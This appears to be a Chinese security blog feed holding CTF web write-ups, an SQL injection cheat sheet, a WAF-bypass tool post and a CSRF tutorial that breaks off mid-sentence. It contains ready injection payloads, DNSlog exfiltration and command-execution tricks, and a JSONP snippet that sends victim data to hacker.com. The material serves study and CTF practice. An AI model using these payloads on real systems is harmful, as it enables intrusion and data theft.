&apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;; die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); &#125; if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123; print &quot;水可载舟，亦可赛艇！&quot;; exit(); &#125;&#125;$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;foreach($_POST as $key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con)&#123; die(&apos;Could not connect: &apos; . mysql_error());&#125;$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);$sql=&quot;SELECT * FROM interest WHERE uname = &apos;&#123;$_POST[&apos;uname&apos;]&#125;&apos;&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) &#123; print &quot;CTF&#123;XXXXXX&#125;&quot;; &#125;else&#123; print &quot;亦可赛艇！&quot;; &#125;&#125;else&#123; print &quot;一颗赛艇！&quot;;&#125;mysql_close($con);?&gt; 阅读源码可知，我们需要让数据库返回的pwd字段与我们post的内容相同，注意此处是弱类型比较。我们知道grou by with roolup 将创建个虚拟表，且表的最后一行pwd字段为Null。 mysql&gt; create table test ( -&gt; user varchar(100) not null, -&gt; pwd varchar(100) not null);mysql&gt;insert into test values(“admin”,”mypass”);mysql&gt;select from test group by pwd with rollupmysql&gt; select from test group by pwd with rollup;+——-+————+| user | pwd |+——-+————+| guest | alsomypass || admin | mypass || admin | NULL |+——-+————+3 rows in setmysql&gt; select from test group by pwd with rollup limit 1;+——-+————+| user | pwd |+——-+————+| guest | alsomypass |+——-+————+mysql&gt; select from test group by pwd with rollup limit 1 offset 0;+——-+————+| user | pwd |+——-+————+| guest | alsomypass |+——-+————+1 row in setmysql&gt; select from test group by pwd with rollup limit 1 offset 1;+——-+——–+| user | pwd |+——-+——–+| admin | mypass |+——-+——–+1 row in setmysql&gt; select from test group by pwd with rollup limit 1 offset 2;+——-+——+| user | pwd |+——-+——+| admin | NULL |+——-+——+1 row in set 构造payload:uname=1&#39; or true group by pwd with rollup limit 1 offset 2#&amp;pwd=offset 2为偏移两个数据，即第三行的pwd字段为空。 0x09 简单的sql注入之3简单概括： 考点：mysql报错注入 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7846917.html 解题过程：exp函数报错一把嗦 0x0A 简单的sql注入之2简单概括： 考点：空格过滤 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7862466.html 解题过程：简单Fuzz发现过滤了空格，使用内敛注释一把嗦。1/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables=database() 0x0B 简单的sql注入之1简单概括： 考点：双层叠加绕过 难度：易 WP：https://www.jianshu.com/p/5d37d33854e3 解题过程1selectselect 0x0C 天下武功唯快不破简单概括： 考点：脚本工具的编写 难度：易 WP：无 解题过程：12345import requests,base64r = requests.get(&apos;http://ctf5.shiyanbar.com/web/10/10.php&apos;)key=base64.b64decode(r.headers[&apos;FLAG&apos;])[-9:]r = requests.post(&apos;http://ctf5.shiyanbar.com/web/10/10.php&apos;,data=&#123;&apos;key&apos;:key&#125;)print(r.text) 0x0D 让我进去简单概括： 考点：hash长度拓展攻击 难度：难 WP：http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/ 0x0E 拐弯抹角简单概括： 考点：index.php/index.php 难度：易 WP：无 解题过程：1index.php/index.php 0X0F Forms简单概括： 考点：不清楚，过于简单 难度：无 WP：无 0x10 天网管理系统简单概括： 考点：PHP==弱类型比较，PHP序列化与反序列化 难度：易 WP：http://www.cnblogs.com/ssooking/p/5877086.html 解题过程：右键查看源代码发现部分源码 ：我们知道0e开头的字符串在与数字0做弱类型比较时会先转成数值0在比较，故：我们只要输入一个经md5加密后密文为0e开头的字符串即可。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 0x11 忘记密码了简单概括： 考点：vim源码泄露 难度：中 WP：.submit.php.swp 解题过程：打开题目，观察源码，发现管理员邮箱：admin@simplexue.com，随便输入一个内容提交，显示step2.php，尝试访问step2.php，网页被重定向且返回html源码，发现存在submit.php文件，猜测存在swp源码泄露，访问.submit.php.swp文件得到部分源码。123456789101112131415161718192021222324252627282930313233343536373839404142........这一行是省略的代码......../*如果登录邮箱地址不是管理员则 die()数据库结构---- 表的结构 `user`--CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT &apos;0&apos;, PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;---- 转存表中的数据 `user`--INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES(1, &apos;****不可见***&apos;, &apos;***不可见***&apos;, 0);*/........这一行是省略的代码........if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die(&apos;fail&apos;); if($token!=&apos;0&apos;) die(&apos;fail&apos;); $sql = &quot;SELECT count(*) as num from `user` where token=&apos;$token&apos; AND email=&apos;$emailAddress&apos;&quot;; $r = mysql_query($sql) or die(&apos;db error&apos;); $r = mysql_fetch_assoc($r); $r = $r[&apos;num&apos;]; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo &quot;失败了呀&quot;; &#125;&#125; payload: `token=0e11111111&amp;emailAddress=admin@simplexue.com` 0x12 Once More简单概括： 考点：ereg函数%00截断，科学计数法 难度：易 WP：1e9%00*-* 解题过程：打开题目，得到题目源码：1234567891011121314151617181920212223&lt;?phpif (isset ($_GET[&apos;password&apos;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) &#123; echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;; &#125; else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999) &#123; if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE) &#123; die(&apos;Flag: &apos; . $flag); &#125; else &#123; echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;); &#125; &#125; else &#123; echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;; &#125;&#125;?&gt; 首先判断是否用过get方式传入password，其次判断是否只含有数字和字母，如果是则返回错误，接着判断长度小于8且大于9999999。看到这里估计就知道是要考科学计数法了，最后要求get的数据包含*-*。我们知道1E8就等于10000000，这样就可以满足长度小于8且大于9999999的条件，不过我们先得绕开判断只有数字和字母的条件，我们知道ereg函数可利用%00进行截断攻击，故我们的payload构造如下：?password=1e8%00*-*注意此处的%00只占一个字符的大小。 0x13 Guess Next Session简单概括： 考点：Session与Cookie绑定，PHP弱类型比较 难度：易 WP：删掉Cookie，?password= 解题过程：打开题目得到源码：1234567891011&lt;?phpsession_start(); if (isset ($_GET[&apos;password&apos;])) &#123; if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;]) die (&apos;Flag: &apos;.$flag); else print &apos;&lt;p&gt;Wrong guess.&lt;/p&gt;&apos;;&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; 创建session，通过get方式取password值再与session里的password值进行比较，这里我们不知道 session里的password值是多少的，而且我们并不能控制session，不过这里的比较是用==弱类型比较，猜想，如果我们将cookie删除，那么$_SESSION[‘password’]的值将为NULL，此时如果我们get传入的 password为空，即’’，那么比较结果即为true。payload:将cookie删除或禁用，接着访问?password= 0x14 FALSE简单概括： 考点：sha1,md5等传入数组返回Null，PHP弱类型比较 难度：易 WP：?name[]=1&amp;password[]=2 解题过程：打开题目获得源码：123456789101112&lt;?phpif (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;])) &#123; if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;]) echo &apos;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&apos;; else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;])) die(&apos;Flag: &apos;.$flag); else echo &apos;&lt;p&gt;Invalid password.&lt;/p&gt;&apos;;&#125;else&#123; echo &apos;&lt;p&gt;Login first!&lt;/p&gt;&apos;;?&gt; 我们知道sha1()函数与md5()类似，当参数为数组时会返回NULL，如果我们传入的name与password为数组时无论其为什么值，都可以通过sha1($name)===sha1($password)的强类型判断。故我们的payload构造如下：?name[]=a&amp;password[]=b 0x15 上传绕过简单概括： 考点：目录名%00截断 难度：易 WP：/upload/1.php%00 解题过程：burp抓个上传包：首先尝试了文件名%00阶段，发现无用，然后看到了我们可以控制上传的目录名，猜测后台为获取目录名再与文件名拼接。如果我们的目录名存在截断漏洞，那么我们可以构造/uploads/1.php%00这样拼接的时候就只有目录名，达到getshell的目的。 0x16 NSCTF web200简单概括： 考点：逆加密过程 难度：易 WP：1234567部分：x = &quot;~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg&quot;c = &quot;&quot;for a in x: b = ord(a) c += chr(b-1)print(c) 解题过程：打开题目：解密问题，按照加密过程反着解密即可。 0x17 程序逻辑问题简单概括： 考点：union select联合注入 难度：易 WP：user=123aaa%27+union+select+%27c4ca4238a0b923820dcc509a6f75849b&amp;pass=1 解题过程：打开题目，右键查看源代码得到题目源码：1234567891011121314151617181920212223242526272829303132333435363738394041&lt;html&gt;&lt;head&gt;welcome to simplexue&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;); mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;); if ($conn-&gt;connect_error) &#123; die(&quot;Connection failed: &quot; . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;$query = mysql_query($sql);if (!$query) &#123; printf(&quot;Error: %s\n&quot;, mysql_error($conn)); exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;&#125;else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=&quot;Username&quot;&gt;&lt;input type=password name=pass value=&quot;Password&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=&quot;index.txt&quot;&gt;&lt;/html&gt; strcasecmp()函数不分大小写进行字符串比较。首先我们不知道数据库里已有的用户值为多少，更不知其密码。不过我们可以通过构造联合查询注入来返回我们自定义的数据。payloadd:user=abc&#39; union select &#39;c4ca4238a0b923820dcc509a6f75849b&amp;pass=11的md5为：c4ca4238a0b923820dcc509a6f75849b 0x18 what a fuck!这是什么鬼东西?简单概括： 考点：JSFUCK 难度：易 WP：复制代码到浏览器控制台执行即可 解题过程：复制粘贴进浏览器的js控制台，回车运行即可。 0x19 PHP大法简单概括： 考点：PHP自动解码机制 难度：易 WP：id=%2568ackerDJ 解题过程：打开题目，页面提示：index.php.txt，打开得到源码：123456789101112131415&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123; echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;&#125;?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website? $_GET[id]在取到值后已经自动urldecode了一次，然而后边再用urldecode解码一次，故可以使用二次编码绕过前边的关键字检测。 0x1A 这个看起来有点简单!简单概括： 考点：Union无过滤注入 难度：易 WP：无 0x1B 貌似有点难简单概括： 考点：Header头IP伪造 难度：易 WP：无 0x1C 头有点大简单概括： 考点：UA头伪造 难度：易 WP：无 0x1D 猫抓老鼠简单概括： 考点：脑洞 难度：及其变态神经病的题目 WP：无 解题过程：查看访问请求返回头，发现有东西：将这串base64放到表单里提交即可。 0x1E 看起来有点难简单概括： 考点：时间盲注 难度：中 WP：sqlmap一把嗦]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入备忘录]]></title>
    <url>%2F2019%2FSQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95%2F</url>
    <content type="text"><![CDATA[备忘录(一)拿起小本本记下常考知识点。 常用连接词 and &amp;&amp; %23%23 且 or || %7c%7c 或 xor 非 Access 数据库：只能爆破表名、列名获取数据、无法用盲注等数据主要存储在mdb、sap文件内 0x01 手工：先判断字段数：order by xx在使用联合查询猜测表名列名： 前后两个子查询返回的结构必须相同，且数据类型必须相同，故常用NULL 猜表：union select 1,2,3,xx猜列：union select 1,2,password,4,5 (如果页面返回正常，则存在password列，猜表同理)此方法兼容性不强。 0x02 工具：逐字猜解法：一、查表：and exists (select * from 表名)//这里的表名需要靠猜解，如果表名存在返回正常页面。二、查列：将*换成列名可进行爆破列名，即：and exists (select 列名 from 表名)三、确定列名下的数据长度：and (select top 1 len(列名) from 表名)=5 //判断数据长度是否为5，若为5则返回正常四、逐字猜解数据：and (select top 1 asc(mid(列名,位数,1)) from 表名)=97 //用mid函数取第x位字母，通过asc函数转化成ascii码进行判断比较，如果ascii为97，即字母a，页面返回正常 mysql数据库：Version&lt;5.0: 爆破 盲注 version&gt;=5.0:information_schema表下存储了Mysql数据库所有的数据库结果信息。 information_schema.schemeta //Mysql里所有的数据库库名 information_schema.tables //所有表名 information_schema.columns //所有列名 常用函数： user() //查询数据库用户 version() //查询版本 @@basedir() //查询数据库路径 database() //查询当前数据库名 @@version_compile_os() //查询操作系统 用法例子：union select user(),2,3,version(),database(),xxx可用null代替：union select user(),null,null,version(),database(),xxx 更多函数： concat() //字符串相加 group_concat() //分组打印 length() //取字符串长度 substr(str,pos,len) //str字符串从pos位置开始取len个长度 substring()别名 mid(str,pos,len) //str字符串从pos位置开始取len个长度 ascii(str) //返回字符串str的首个字符的ASCII代码值 ord(str) //str或bool转为ascii if(a,b,c) //a为条件，若a正确则返回b，相反返回c. 常用查询：查询全部数据库名：select schema_name from information_schema.schemeta limit 0,10 //取前十个查询指定表名：select table_name from information_schema.tables where table_schema=&#39;sqli&#39; //若单引号被过滤可用十六进制查询指定列名：select column_name from information_schema.columns where table_name=&#39;user&#39; and table_schema=&#39;sqli&#39;获取指定数据:select username,password from sqli.user (垮库查询) 注释： #，– X(X为任意字符)/(MySQL-5.1);%00&#39;or 1=1;%00 &#39;or 1=1 union select 1,2‘‘or 1=1 #‘/!50000or/ 1=1 – - //版本号为5.1.38时只要小于50138‘/!or*/ 1=1 – - nd/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略 宽字节注入：一、常见：mysql数据库编码为gbk,且若’被转义成\’使用id=%df%27，这里的%27会被变成\%27即%5c%27，再加上前边的%df变成%df%5c%27，而%df%5c在gbk字符集中表示汉子： 運，故语句便成id=運&#39;，成功逃逸出单引号转义(php中通常是addslashes函数，或开启GPC，PHP5.4版本已移除GPC)二、php函数utf8转gbk产生：https://xz.aliyun.com/t/1719 报错注入：floor()和rand()虚拟表报错原理：payload:union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by ahttps://www.2cto.com/article/201604/498394.html extractvalue()原理：extractvalue函数的第二个参数格式错误，会返回参数内容payload:and (extractvalue(1,concat(0x7e,(select user()),0x7e))) updatexml() 同上具有32位长度限制原理同上payload:and (updatexml(1,concat(0x7e,(select user()),0x7e),1))// concat 在前后加上 ~ 使数据不符合参数格式从而报错 GeometryCollection()等三重子查询报错 id = 1 AND GeometryCollection((select from (select from(select user())a)b))polygon()id =1 AND polygon((select from(select from(select user())a)b))multipoint()id = 1 AND multipoint((select from(select from(select user())a)b))multilinestring()id = 1 AND multilinestring((select from(select from(select user())a)b))linestring()id = 1 AND LINESTRING((select from(select from(select user())a)b))multipolygon()id =1 AND multipolygon((select from(select from(select user())a)b)) exp() Mysql5.5.5+原理：exp函数参数过大，转换时溢出报错payload:and exp(~(select * from(select user())a))https://drops.secquan.org/tips/8166 以上类型均为子查询注入Mysql盲注：类型 布尔盲注 时间盲注 布尔盲注：and ascii(substr(select user(),1,1))&gt;64 如果user()第一位字母Ascii大于64则页面返回正常时间盲注：and if(ascii(substr(select user(),1,1))&gt;64,sleep(2),1) 如果user()第一位字母Ascii大于64则页面延迟两秒返回 BENCHMARK(count,expr)此函数会执行expr函数count此，会造成明显时间延迟，可构造进行时间盲注 常见注入： 数字型 字符串型按照注入类型：+SELECT型 //常用于获取信息，注入处常位于where 后，后可接注释字符保证查询的语法正确。+INSERT型 //建立新的数据+UPDATA型 //修改数据+DELECT型 //删除数据 MYSQL长度限制绕过MYSQL对于用户输入的超长字符只会warning 而不是error真实案例： WP注册admin(55个空格)x用户 修改管理员密码 DNSlog注入select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\&#39;);https://www.cnblogs.com/afanti/p/8047530.htmlhttps://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html SQL注入防御：1.预编译sql2.限制输入数据类型3.过滤编码4.白名单5.管理数据库用户权限6.按时维护，打好补丁 SQL注入绕过：注入中常注意的编码： %01-%0D特殊字符绕空格 &amp;= 在浏览器Url时要进行URL编码 %26 %3d 查询字符串中不允许有空格，可用%20,+对其编码 Cookie注入时，SQL语句中的分号得编码 单引号过滤若有单引号保护，且无编码二次注入即无漏洞。若无单引号保护：字符串可用十六进制表示：0x123456，也可用concat(char(65)+char(75)+xxx) 注：中间层会将这些编码转换成未编码值 逗号过滤if()可改写为 case when () then () else () endsubstr()、mid()等可改写成substr((select user())from(1)for(1)) 等号过滤可用regexp、like、rlike、in等代替 判断注入点时的绕过： &amp;&amp; 1=1 &amp;&amp; 1=true &amp;&amp; false %23%23 true %23%23 ‘0’=0 %23%23 ‘a’=’b’=’c’ //true and~!!~if(‘a’=’b’=”c”,sleep(2),1) a’&lt;2 返回正常 &lt;0 返回空值 特定字符串被过滤时可用考虑全角字符 绕过WAF a) 大小写混合b)替换关键字c)使用编码d)使用注释e)等价函数与命令f)使用特殊符号g)HTTP参数控制h)缓冲区溢出i)整合绕过 与系统直接交互： load_file()读取文件into out_file() 写文件条件：FILE权限，管理员权限默认具有INTO OUTFILE 与 INTO DOMPFILE的区别后者适用于二进制文件，会将目标文件写入同一行内；前者适用于文本文件。MYSQL UDF命令执行：sqlmap: --os-cmd id -v 1MSSQL：xp_cmdshell 其他：Boolean注入如果页面只返回Yes或No，则原sql查询返回的值可能是可bool值，如果过滤不严，可产生boolean注入，如：and length(database())&gt;10 如果次条件为真切前条件返回真，则页面返回正常。 Cookie注入注入存在于Cookie中 XFF头注入注入存在于Header有中的X-Forward-For中，此函数常用于获取客户端真实IP。 堆叠注入PHP+Mysql不支持 连接符差异：Oracle: || 是连接符MSSQL: +MYSQL: [空格] 相关好文：SQL注入备忘手册(更新2017-12-11)巧用DNSlog实现无回显注入MySQL注入技巧Mysql报错注入原理分析(count()、rand()、group%20by)深入了解SQL注入绕过waf和过滤机制]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>备忘录</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入使用Django中继数据包bypassWAF]]></title>
    <url>%2F2019%2FSQL%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8Django%E4%B8%AD%E7%BB%A7%E6%95%B0%E6%8D%AE%E5%8C%85bypassWAF%2F</url>
    <content type="text"><![CDATA[原理本人基于文章bypassword的文章在HTTP协议层面绕过WAF所编写一款工具。 环境 Python3.7.0 Django 2.1 Requests 使用范围 POST注入 可以分块传输的漏洞网站 使用方法修改图中圈中的部分，Evil_Url为存在注入的地址，Domain为其域名部分。 实例靶机环境:PHP5.4+Apache2.2+Mysql5+WAF:首先部署Django：其次将注入点换成部署的Url：如：http://192.168.32.144/2.php存在POST注入，注入参数为id，部署的Url为http://127.0.0.1:8000/Sqlmap命令为python sqlmap.py -u &quot;http://127.0.0.1:8000/&quot; --data &quot;id=1&quot; 支持-r xx.txt需要修改请求头中的Host地址为Django部署的地址 下载地址：https://github.com/HackerYunen/Django-chunked-sqli此项目我不断更新完善，欢迎Star、Issue TODO 暂无 解疑为什么使用Django？因为我只会Django 为什么要中继？因为sqlmap等软件无法发送chunked数据包(使用tamper也不行)]]></content>
      <categories>
        <category>神兵利器</category>
      </categories>
      <tags>
        <tag>Django</tag>
        <tag>SQL注入</tag>
        <tag>Bypass</tag>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于CSRF的那点事儿]]></title>
    <url>%2F2019%2F%E5%85%B3%E4%BA%8ECSRF%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B%E5%84%BF%2F</url>
    <content type="text"><![CDATA[0x01 CSRF简介&#160;&#160;&#160;&#160;CSRF，也称XSRF，即跨站请求伪造攻击，与XSS相似，但与XSS相比更难防范，是一种广泛存在于网站中的安全漏洞，经常与XSS一起配合攻击。 0x02 CSRF原理&#160;&#160;&#160;&#160;攻击者通过盗用用户身份悄悄发送一个请求，或执行某些恶意操作。&#160;&#160;&#160;&#160;CSRF漏洞产生的主要原因： 请求所有的参数均可确定 请求的审核不严格，如：只验证了Cookie 关于CSRF的执行过程，这里引用自hyddd大佬画的图：&#160;&#160;&#160;&#160;我们知道，当我们使用img等标签时，通过设置标签的src等属性引入外部资源，是可以被浏览器认为是合法的跨域请求，也就是说是可以带上Cookie访问的。&#160;&#160;&#160;&#160;试想一下，如果我们在a.com上放置一个img标签&lt;img src=//b.com/del?id=1&gt;。当b.com的用户在cookie没过期的情况下访问a.com，此时浏览器会向b.com发送一个指向http://b.com/del?id=1的GET请求，并且这个请求是带上Cookie的，而b.com的服务器仅仅是通过cookie进行权限判断，那么服务器就会进行相应的操作，比如假设此处为删除某个文章，用户在不知情的情况下便已完成操作。 0x03 CSRF能够造成的危害 篡改目标网站上的用户数据； 盗取用户隐私数据； 作为其他攻击向量的辅助攻击手法； 传播CSRF蠕虫。 0x04 CSRF的利用方式 通过HTML标签发送合法的跨域请求 通过Ajax发送请求（由于CORS机制的存在，一般不使用） 这里涉及到同源策略，如果不是很清楚可以先去了解一下。 1) HTML标签&#160;&#160;&#160;&#160;我们知道，根据同源策略的规定，跨域请求是不允许带上Cookie等信息的，可是出于种种考虑最终没有进行完全禁止，即存在某些合法的跨域请求。&#160;&#160;&#160;&#160;通常由HTML标签src、lowsrc等属性产生的跨域请求是被浏览器认为是合法的跨域请求，并且此时并不需要javascript的参与。&#160;&#160;&#160;&#160;由HTML标签发出的合法跨域请求与正常的用户点击发出的请求相比所不同的是：两者请求头中的Referer值不同。&#160;&#160;&#160;&#160;不过值得说明的是IE浏览器在面对这种情况时会判断本地Cookie是否带上P3P属性，如果仅仅是内存Cookie则不受此影响。&#160;&#160;&#160;&#160;CSRF不仅仅只能针对GET请求，也可以针对POST请求，不过只能使用from标签进行自动提交，注意此处需用到javascript。12345678910111213&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://a.com/changepass&quot; method=&quot;POST&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;victim&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;hacker&quot;&gt;&lt;input id=&quot;sub&quot; type=&quot;submit&quot;&gt; //可用样式表将按钮隐藏&lt;/form&gt; &lt;script&gt;document.getElementById(&quot;sub&quot;).click()&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 2) Ajax&#160;&#160;&#160;&#160;除了通过HTML标签发送跨域请求外，还可以通过Ajax来发送跨域情况，不过Ajax是严格遵守CORS规则的。&#160;&#160;&#160;&#160;关于CORS规则，不清楚的可以去看看evoA大佬的一篇文章跨域方式及其产生的安全问题。&#160;&#160;&#160;&#160;简单来说就是需要构造的xhr的withCredentials属性也为true才能带上Cookie进行跨域请求，与IE兼容性不好，且构造难度较Html复杂，故通常情况下我们不使用Ajax来进行CSRF攻击。&#160;&#160;&#160;&#160;通常使用Ajax来跨域进行CSRF攻击的漏洞一般都配合XSS漏洞，此时的Ajax与目标域相同，不受CORS的限制。 0x05 CSRF利用实例1) 常用利用方式&#160;&#160;&#160;&#160;攻击者构造恶意html，通过引诱用户/管理员访问，触发CSRF漏洞。 2) 结合XSS利用&#160;&#160;&#160;&#160;CSRF+XSS结合，产生的危害已几何倍数剧增。如果CSRF和XSS两个漏洞是在同一个域下的话，那么此时的CSRF已经变成了OSRF了，即本站点请求伪造(出自黑客攻防技术宝典Web实战篇第二版p366)，此时已经变成XSS的请求伪造攻击，本文不在赘述。 3) jsonp&#160;&#160;&#160;&#160;我们知道网站api返回的数据类型一般为json型或Array型，这里我们仅讨论json型。&#160;&#160;&#160;&#160;当我们需要调用远程api时json返回的数据一般如下：1user(&#123;&quot;name&quot;:&quot;Yunen&quot;,&quot;work&quot;:&quot;Student&quot;,&quot;xxxx&quot;:&quot;xxxxxxxxx&quot;,......&#125;) &#160;&#160;&#160;&#160;这是因为开发者如果需要调用远程服务器的api获取json数据，由于同源策略的限制，通过ajax获取就会显得比较麻烦，相比之下&lt;script&gt;标签的开放策略，无疑是最好的方法去弥补这一缺陷，使得json数据可以进行方便的跨域传输。此处的user为回调函数名，一般为某个请求参数值(比如：callback)，就上述例子说，只需要通过下面方法即可调用返回的数据：12345&lt;script&gt; function user(data)&#123; console.log(data);//此时的json数据已经存储进了data变量中 &#125;&lt;/script&gt; &#160;&#160;&#160;&#160;这种远程api接口十分容易受到CSRF攻击，我们可以通过修改callback参数值并添加自定义函数，如：123456789101112&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt; function jsonphack(data)&#123; new image().src=&quot;http://hacker.com/json.php?data=&quot;+escape(data); //将json返回的数据发送到黑客服务器上 &#125;&lt;/script&gt;&lt;script src=&quot;http://127.0.0.1/1.php?callback=jsonphack&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4) 更多例子从零开始学CSRFWeb安全系列 – Csrf漏洞phpMyAdmin 4.7.x CSRF 漏洞利用 0x06 防御CSRF攻击&#160;&#160;&#160;&#160;前边我们说到，产生CSRF的原因主要有两点，那么我们可以针对这两点进行相应的防御。 1) Token&#160;&#160;&#160;&#160;我们知道CSRF攻击的请求除了Cookie以外，其他的内容必须提前确定好，那么如果我们在服务端要求提交的某一个参数中是随机的值呢？&#160;&#160;&#160;&#160;这里我们称这个随机的、无法被预计的值叫做Token，一般是由服务端在接收到用户端请求后生成，返回给用户的Token通常放置在hidden表单或用户的Cookie里。&#160;&#160;&#160;&#160;当用户打开正常的发送请求的页面时，服务器会生成一串随机的Token值给浏览器，在发送请求时带上此Token，服务端验证Token值，如果相匹配才执行相应的操作、销毁原Token以及生成并返回新的Token给用户，这样做不仅仅起到了防御CSRF的作用，还可以防止表单的重复提交。&#160;&#160;&#160;&#160;由于HTML标签产生的合法跨域只能是单向请求，无法通过CSRF直接取返回的内容，所以我们无法使用CSRF先取Token值再构造请求，这使得Token可以起到防御CSRF的作用。&#160;&#160;&#160;&#160;注意Token不应该放置在网页的Url中，如果放在Url中当浏览器自动访问外部资源，如img标签的src属性指向攻击者的服务器，Token会出现作为Referer发送给外部服务器，以下为相关实例： WooYun-2015-136903 2) 